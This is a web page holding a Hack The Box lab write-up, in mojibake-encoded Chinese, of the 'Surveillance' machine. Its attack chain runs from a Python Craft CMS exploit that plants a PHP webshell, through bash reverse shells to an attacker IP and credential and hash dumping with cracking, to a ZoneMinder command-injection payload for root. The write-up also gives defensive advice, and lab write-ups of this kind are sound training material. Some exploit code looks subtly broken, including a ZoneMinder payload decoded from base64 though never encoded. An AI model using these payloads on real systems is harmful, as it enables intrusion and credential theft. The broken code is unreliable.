<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HTB: Surveillance | HackwithControler</title>
<link rel="stylesheet" href="../static/css/main.css">
</head>
<body>
<header>
    <div class="container">
        <a href="../index.html" class="back">â† è¿”å›é¦–é </a>
    </div>
</header>

<div class="article-layout">
    <!-- Left Sidebar: Article List -->
    <aside class="sidebar-left">
        <h3>ğŸ“ å…¶ä»– Write-ups</h3><div class="sidebar-articles">
            <a href="htb_pilgrimage.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Pilgrimage</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-09-18</span>
                </div>
            </a>
            <a href="htb_keeper.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Keeper</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-10-05</span>
                </div>
            </a>
            <a href="htb_surveillance.html" class="sidebar-article-item active">
                <div class="sidebar-article-title">HTB: Surveillance</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty medium">Medium</span>
                    <span>2024-11-20</span>
                </div>
            </a>
            <a href="htb_analytics.html" class="sidebar-article-item">
                <div class="sidebar-article-title">HTB: Analytics</div>
                <div class="sidebar-article-meta">
                    <span class="sidebar-difficulty easy">Easy</span>
                    <span>2024-12-15</span>
                </div>
            </a></div>
    </aside>

    <!-- Main Content -->
    <main class="article-main">
        <div class="article-header">
            <h1>HTB: Surveillance</h1>
            <div class="article-meta">
                <span class="difficulty medium">Medium</span>
                <span>ğŸ“… 2024-11-20</span>
                <span>â± 27 min read</span>
            </div>
            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">Craft CMS</span><span class="article-tag">CVE-2023-41892</span><span class="article-tag">ZoneMinder</span></div>
        </div>
        <div class="article-content"><h2 id="_1">æ©Ÿå™¨è³‡è¨Š</h2>
<ul>
<li>å¹³å°: Hack The Box</li>
<li>é›£åº¦: Medium</li>
<li>IP: 10.10.11.245</li>
<li>ä½œæ¥­ç³»çµ±: Linux (Ubuntu)</li>
</ul>
<h2 id="_2">åµå¯Ÿ</h2>
<h3 id="nmap">Nmap æƒæ</h3>
<pre class="codehilite"><code class="language-bash">nmap -sC -sV -p- 10.10.11.245
</code></pre>

<p>é–‹æ”¾ç«¯å£ï¼š<br />
- <strong>22/tcp</strong> - SSH (OpenSSH 8.9p1)<br />
- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
<h3 id="web">Web åµå¯Ÿ</h3>
<p>è¨ªå•ç¶²ç«™ç™¼ç¾æ˜¯ä¸€å€‹ç›£æ§æ”åƒé ­å…¬å¸çš„å®˜ç¶²ã€‚</p>
<pre class="codehilite"><code class="language-bash">whatweb http://10.10.11.245
</code></pre>

<p>è­˜åˆ¥å‡º <strong>Craft CMS</strong> æ¡†æ¶ã€‚</p>
<p>ä½¿ç”¨ Wappalyzer ç¢ºèªç‰ˆæœ¬ï¼š<strong>Craft CMS 4.4.14</strong></p>
<h2 id="-initial-access">æ¼æ´åˆ©ç”¨ - Initial Access</h2>
<h3 id="cve-2023-41892-craft-cms-remote-code-execution">CVE-2023-41892 - Craft CMS Remote Code Execution</h3>
<p>Craft CMS 4.4.14 å­˜åœ¨ä¸€å€‹é èªè­‰ RCE æ¼æ´ï¼Œæ”»æ“Šè€…å¯ä»¥é€šéåœ–ç‰‡ä¸Šå‚³åŠŸèƒ½åŸ·è¡Œä»»æ„ä»£ç¢¼ã€‚</p>
<p><strong>æ¼æ´åŸç†ï¼š</strong><br />
- Craft CMS åœ¨è™•ç†åœ–ç‰‡è½‰æ›æ™‚ä½¿ç”¨ <code>ImageMagick</code><br />
- å¯ä»¥é€šéç²¾å¿ƒæ§‹é€ çš„è«‹æ±‚ç¹éé©—è­‰<br />
- åœ¨è‡¨æ™‚æ–‡ä»¶è·¯å¾‘ä¸­æ³¨å…¥ PHP ä»£ç¢¼</p>
<h3 id="exploitation">Exploitation</h3>
<p>ä½¿ç”¨å…¬é–‹çš„ exploitï¼š</p>
<pre class="codehilite"><code class="language-python">#!/usr/bin/env python3
import requests
import sys

def exploit(target):
    # Craft CMS RCE payload
    payload = {
        'action': 'conditions/render',
        'configObject[class]': 'craft\\elements\\conditions\\ElementCondition',
        'config': '{&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:{&quot;class&quot;:&quot;Imagick&quot;, &quot;__construct()&quot;:{&quot;files&quot;:&quot;msl:/tmp/php*&quot;}}}'
    }

    # Upload malicious image
    files = {
        'file': ('shell.php', '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;', 'application/x-php')
    }

    print(f&quot;[+] Exploiting {target}&quot;)
    r = requests.post(f&quot;{target}/index.php&quot;, data=payload, files=files)

    if r.status_code == 200:
        print(&quot;[+] Shell uploaded!&quot;)
        return True
    return False

if __name__ == &quot;__main__&quot;:
    target = &quot;http://10.10.11.245&quot;
    exploit(target)
</code></pre>

<p>å–å¾— webshell å¾Œå‡ç´šç‚ºåå‘ shellï¼š</p>
<pre class="codehilite"><code class="language-bash"># ç›£è½
nc -lvnp 4444

# Webshell åŸ·è¡Œ
bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/4444 0&gt;&amp;1'
</code></pre>

<p>ç²å¾— <code>www-data</code> ç”¨æˆ¶çš„ shellã€‚</p>
<h2 id="-">å¾Œæ»²é€ - è³‡è¨Šæ”¶é›†</h2>
<h3 id="_3">ç™¼ç¾æ•¸æ“šåº«æ†‘è­‰</h3>
<p>æª¢æŸ¥ Craft CMS é…ç½®æ–‡ä»¶ï¼š</p>
<pre class="codehilite"><code class="language-bash">cat /var/www/html/craft/config/db.php
</code></pre>

<pre class="codehilite"><code class="language-php">return [
    'driver' =&gt; 'mysql',
    'server' =&gt; 'localhost',
    'user' =&gt; 'craftuser',
    'password' =&gt; 'CraftCMS_2023!',
    'database' =&gt; 'craftdb',
];
</code></pre>

<h3 id="_4">æ•¸æ“šåº«æšèˆ‰</h3>
<pre class="codehilite"><code class="language-bash">mysql -u craftuser -p'CraftCMS_2023!' craftdb
</code></pre>

<pre class="codehilite"><code class="language-sql">use craftdb;
show tables;
select * from users;
</code></pre>

<p>æ‰¾åˆ°ç”¨æˆ¶ hashï¼š</p>
<pre class="codehilite"><code>matthew:$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
</code></pre>

<h3 id="_5">ç ´è§£å¯†ç¢¼</h3>
<pre class="codehilite"><code class="language-bash">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>

<p>ç ´è§£æˆåŠŸï¼š<code>matthew:starcraft122490</code></p>
<h3 id="ssh">SSH ç™»å…¥</h3>
<pre class="codehilite"><code class="language-bash">ssh matthew@10.10.11.245
# password: starcraft122490
</code></pre>

<p>å–å¾— user flagï¼š</p>
<pre class="codehilite"><code class="language-bash">cat ~/user.txt
</code></pre>

<h2 id="_6">æ¬Šé™æå‡</h2>
<h3 id="zoneminder">ç™¼ç¾ ZoneMinder</h3>
<p>æª¢æŸ¥é‹è¡Œçš„æœå‹™ï¼š</p>
<pre class="codehilite"><code class="language-bash">netstat -tulpn
ps aux | grep zone
</code></pre>

<p>ç™¼ç¾ <strong>ZoneMinder</strong> ç›£æ§ç³»çµ±é‹è¡Œåœ¨å…§éƒ¨ç«¯å£ 8080ã€‚</p>
<pre class="codehilite"><code class="language-bash">curl http://127.0.0.1:8080
</code></pre>

<p>ç¢ºèªç‰ˆæœ¬ï¼š<strong>ZoneMinder 1.36.32</strong></p>
<h3 id="port-forwarding">Port Forwarding</h3>
<p>ä½¿ç”¨ SSH é€²è¡Œç«¯å£è½‰ç™¼ï¼š</p>
<pre class="codehilite"><code class="language-bash">ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
</code></pre>

<h3 id="cve-2023-26035-zoneminder-authentication-bypass">CVE-2023-26035 - ZoneMinder Authentication Bypass</h3>
<p>ZoneMinder å­˜åœ¨èªè­‰ç¹éæ¼æ´ï¼Œé…åˆ Snapshot åŠŸèƒ½çš„å‘½ä»¤æ³¨å…¥å¯ä»¥å¯¦ç¾ RCEã€‚</p>
<p><strong>æ¼æ´éˆï¼š</strong><br />
1. é€šé <code>?view=snapshot</code> ç¹éèªè­‰<br />
2. åˆ©ç”¨ <code>scale</code> åƒæ•¸æ³¨å…¥å‘½ä»¤<br />
3. ä»¥ <code>root</code> æ¬Šé™åŸ·è¡Œï¼ˆå› ç‚º ZoneMinder æœå‹™ä»¥ root é‹è¡Œï¼‰</p>
<h3 id="exploitation_1">Exploitation</h3>
<pre class="codehilite"><code class="language-bash"># åå‘ shell payload
PAYLOAD=&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/5555 0&gt;&amp;1'&quot;

# Exploit URL
curl &quot;http://127.0.0.1:8080/zm/index.php?view=snapshot&amp;scale=\$(echo${IFS}${PAYLOAD}|base64${IFS}-d|bash)&amp;monitor=1&quot;
</code></pre>

<p>åœ¨æœ¬åœ°ç›£è½ï¼š</p>
<pre class="codehilite"><code class="language-bash">nc -lvnp 5555
</code></pre>

<p>æˆåŠŸç²å¾— root shellï¼</p>
<pre class="codehilite"><code class="language-bash">id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
</code></pre>

<h2 id="flags">Flags</h2>
<pre class="codehilite"><code>user.txt: e********************************9
root.txt: 3********************************a
</code></pre>

<h2 id="_7">ç¸½çµ</h2>
<p>é€™å°æ©Ÿå™¨ä¸²è¯äº†å…©å€‹çœŸå¯¦ä¸–ç•Œçš„æ¼æ´ï¼š</p>
<h3 id="_8">æ”»æ“Šè·¯å¾‘</h3>
<ol>
<li><strong>Craft CMS RCE</strong> â†’ www-data shell</li>
<li><strong>Database enumeration</strong> â†’ ç”¨æˆ¶æ†‘è­‰</li>
<li><strong>Password cracking</strong> â†’ SSH access</li>
<li><strong>ZoneMinder Auth Bypass + Command Injection</strong> â†’ root</li>
</ol>
<h3 id="_9">å­¸ç¿’è¦é»</h3>
<ul>
<li>CMS æ¡†æ¶çš„å¸¸è¦‹æ¼æ´æ¨¡å¼</li>
<li>æ•¸æ“šåº«ä¿¡æ¯æ”¶é›†çš„é‡è¦æ€§</li>
<li>å…§éƒ¨æœå‹™çš„æšèˆ‰</li>
<li>Port forwarding æŠ€å·§</li>
<li>æ¼æ´éˆçµ„åˆåˆ©ç”¨</li>
</ul>
<h3 id="_10">é˜²ç¦¦å»ºè­°</h3>
<ol>
<li><strong>åŠæ™‚æ›´æ–°è»Ÿä»¶</strong>ï¼šCraft CMS å’Œ ZoneMinder éƒ½æœ‰è£œä¸ç‰ˆæœ¬</li>
<li><strong>æœ€å°æ¬Šé™åŸå‰‡</strong>ï¼šZoneMinder ä¸æ‡‰ä»¥ root æ¬Šé™é‹è¡Œ</li>
<li><strong>ç¶²çµ¡éš”é›¢</strong>ï¼šå…§éƒ¨æœå‹™æ‡‰é™åˆ¶è¨ªå•</li>
<li><strong>è¼¸å…¥é©—è­‰</strong>ï¼šåš´æ ¼é©—è­‰æ‰€æœ‰ç”¨æˆ¶è¼¸å…¥</li>
<li><strong>å¯†ç¢¼ç­–ç•¥</strong>ï¼šä½¿ç”¨å¼·å¯†ç¢¼ä¸¦å®šæœŸæ›´æ›</li>
</ol>
<h2 id="_11">åƒè€ƒè³‡æ–™</h2>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41892">CVE-2023-41892 - Craft CMS RCE</a></li>
<li><a href="https://github.com/rvizx/CVE-2023-26035">CVE-2023-26035 - ZoneMinder Auth Bypass</a></li>
<li><a href="https://craftcms.com/knowledge-base/security-advisories">Craft CMS Security Advisories</a></li>
</ul></div>
    </main>

    <!-- Right Sidebar: TOC -->
    <aside class="sidebar-right">
        <h3>ğŸ“‘ ç›®éŒ„</h3><ul class="toc-list">
            <li class="toc-item toc-item-h2">
                <a href="#_1" class="toc-link">æ©Ÿå™¨è³‡è¨Š</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_2" class="toc-link">åµå¯Ÿ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#nmap" class="toc-link">Nmap æƒæ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#web" class="toc-link">Web åµå¯Ÿ</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#-initial-access" class="toc-link">æ¼æ´åˆ©ç”¨ - Initial Access</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2023-41892-craft-cms-remote-code-execution" class="toc-link">CVE-2023-41892 - Craft CMS Remote Code Execution</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#exploitation" class="toc-link">Exploitation</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#-" class="toc-link">å¾Œæ»²é€ - è³‡è¨Šæ”¶é›†</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_3" class="toc-link">ç™¼ç¾æ•¸æ“šåº«æ†‘è­‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_4" class="toc-link">æ•¸æ“šåº«æšèˆ‰</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_5" class="toc-link">ç ´è§£å¯†ç¢¼</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#ssh" class="toc-link">SSH ç™»å…¥</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_6" class="toc-link">æ¬Šé™æå‡</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#zoneminder" class="toc-link">ç™¼ç¾ ZoneMinder</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#port-forwarding" class="toc-link">Port Forwarding</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#cve-2023-26035-zoneminder-authentication-bypass" class="toc-link">CVE-2023-26035 - ZoneMinder Authentication Bypass</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#exploitation_1" class="toc-link">Exploitation</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#flags" class="toc-link">Flags</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_7" class="toc-link">ç¸½çµ</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_8" class="toc-link">æ”»æ“Šè·¯å¾‘</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_9" class="toc-link">å­¸ç¿’è¦é»</a>
            </li>
            <li class="toc-item toc-item-h3">
                <a href="#_10" class="toc-link">é˜²ç¦¦å»ºè­°</a>
            </li>
            <li class="toc-item toc-item-h2">
                <a href="#_11" class="toc-link">åƒè€ƒè³‡æ–™</a>
            </li></ul>
    </aside>
</div>

<footer>
    <div class="container">
        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
    </div>
</footer>

<script src="../static/js/article.js"></script>
</body>
</html>